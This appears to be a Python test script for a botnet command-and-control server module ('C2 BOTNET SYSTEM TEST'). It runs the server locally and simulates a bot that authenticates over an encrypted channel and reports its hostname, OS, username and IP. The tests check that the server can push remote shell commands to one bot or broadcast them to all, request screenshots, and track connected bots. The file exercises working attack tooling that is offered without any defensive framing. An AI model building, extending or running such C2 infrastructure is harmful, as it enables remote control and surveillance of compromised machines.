import socket
import struct
import json
import threading
import time
import sys
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Remove old key to start fresh
KEY_FILE = os.path.join("c2_data", "c2_key.key")
if os.path.exists(KEY_FILE):
    os.remove(KEY_FILE)

# Import and start server in a thread
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import c2_server

server = c2_server.C2Server("127.0.0.1", 4443, "test_pass")

def server_thread():
    server.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.server_socket.bind(("127.0.0.1", 4443))
    server.server_socket.listen(10)
    server.running = True
    while server.running:
        try:
            conn, addr = server.server_socket.accept()
            t = threading.Thread(target=server.handle_bot, args=(conn, addr), daemon=True)
            t.start()
        except:
            break

t = threading.Thread(target=server_thread, daemon=True)
t.start()
time.sleep(1)

# Get cipher
with open(KEY_FILE, "rb") as f:
    key = f.read()
cipher = Fernet(key)

passed = 0
failed = 0

def test(name, cond):
    global passed, failed
    if cond:
        print(f"  [PASS] {name}")
        passed += 1
    else:
        print(f"  [FAIL] {name}")
        failed += 1

def send_packet(sock, data_type, payload):
    packet = json.dumps({"type": data_type, "payload": payload})
    encrypted = cipher.encrypt(packet.encode())
    header = struct.pack("!I", len(encrypted))
    sock.sendall(header + encrypted)

def recv_packet(sock, timeout=5):
    sock.settimeout(timeout)
    header = sock.recv(4)
    if not header or len(header) < 4:
        return None, None
    data_len = struct.unpack("!I", header)[0]
    encrypted = b""
    while len(encrypted) < data_len:
        chunk = sock.recv(data_len - len(encrypted))
        if not chunk:
            return None, None
        encrypted += chunk
    sock.settimeout(None)
    decrypted = cipher.decrypt(encrypted)
    packet = json.loads(decrypted)
    return packet.get("type"), packet.get("payload")

print("=" * 50)
print("C2 BOTNET SYSTEM TEST")
print("=" * 50)

print("\n[TEST 1] Server started")
test("Server is running", server.running)

print("\n[TEST 2] Bot connection & auth")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect(("127.0.0.1", 4443))

# Authenticate with raw password
sock.send(b"test_pass")
auth = sock.recv(1024)
test("Auth response OK", auth == b"AUTH_OK")

print("\n[TEST 3] Encrypted packet handshake")
data_type, payload = recv_packet(sock)
test("Server sent ping after connect", data_type == "ping" and payload.get("msg") == "connected")

# Send bot info
send_packet(sock, "info", {
    "hostname": "TEST-PC", "os": "Windows", "os_version": "10",
    "architecture": "x64", "username": "test", "ip": "127.0.0.1"
})
test("Sent info packet", True)

# Send pong
send_packet(sock, "pong", {"alive": True})
test("Sent pong response", True)

# Wait and verify server registered the bot
time.sleep(1)
test("Bot registered in server", "BOT-0001" in server.bots)

print("\n[TEST 4] Command execution flow")
# Send exec command from server to bot
server.send_to_bot("BOT-0001", "exec", {"cmd": "echo hello"})
data_type, payload = recv_packet(sock)
test(f"Bot received exec command: {payload.get('cmd','')}", data_type == "exec" and payload.get("cmd") == "echo hello")

# Bot sends result back
send_packet(sock, "result", "hello\n")
time.sleep(0.5)
test("Bot result registered", True)

print("\n[TEST 5] Screenshot request")
if len(sys.argv) > 1 and sys.argv[1] == "--full":
    server.send_to_bot("BOT-0001", "screenshot", {})
    data_type, payload = recv_packet(sock)
    test(f"Bot received screenshot request", data_type == "screenshot")

    # Bot sends screenshot (mock)
    send_packet(sock, "screenshot", {"data": base64.b64encode(b"fake_image_data").decode()})
    time.sleep(0.5)
    test("Screenshot received by server", True)
else:
    print("  [SKIP] Screenshot test (pass --full to test)")

print("\n[TEST 6] Bot list")
bot_list = server.list_bots()
test("Bot list not empty", "BOT-0001" in bot_list)
test("Hostname in list", "TEST-PC" in bot_list)

print("\n[TEST 7] Bot info")
with server.lock:
    info = server.bots.get("BOT-0001", {}).get("info", {})
test("Bot hostname stored", info.get("hostname") == "TEST-PC")
test("Bot OS stored", info.get("os") == "Windows")

print("\n[TEST 8] Broadcast")
server.broadcast("exec", {"cmd": "broadcast_test"})
data_type, payload = recv_packet(sock)
test(f"Bot received broadcast: {payload.get('cmd','')}", data_type == "exec" and payload.get("cmd") == "broadcast_test")

print("\n[TEST 9] Clean disconnect")
sock.close()
time.sleep(0.5)
test("Bot removed after disconnect", "BOT-0001" not in server.bots)

print("\n[TEST 10] Reconnection")
time.sleep(2)
sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock2.settimeout(10)
sock2.connect(("127.0.0.1", 4443))
sock2.send(b"test_pass")
auth2 = sock2.recv(1024)
test("Second bot auth OK", auth2 == b"AUTH_OK")
if auth2 == b"AUTH_OK":
    data_type, _ = recv_packet(sock2)
    test("Second bot ping received", data_type == "ping")
    send_packet(sock2, "info", {"hostname": "PC2", "os": "Linux", "ip": "10.0.0.2"})
    send_packet(sock2, "pong", {"alive": True})
    time.sleep(1)
    test("Second bot registered", "BOT-0002" in server.bots)
    sock2.close()
    time.sleep(0.5)
    test("All bots cleaned up after disconnect", len(server.bots) == 0)
else:
    print(f"  [INFO] auth2 was: {auth2!r}")

# Stop server
server.running = False
server.server_socket.close()

print("\n" + "=" * 50)
print(f"RESULTS: {passed} passed, {failed} failed out of {passed + failed} tests")
print("=" * 50)

sys.exit(0 if failed == 0 else 1)
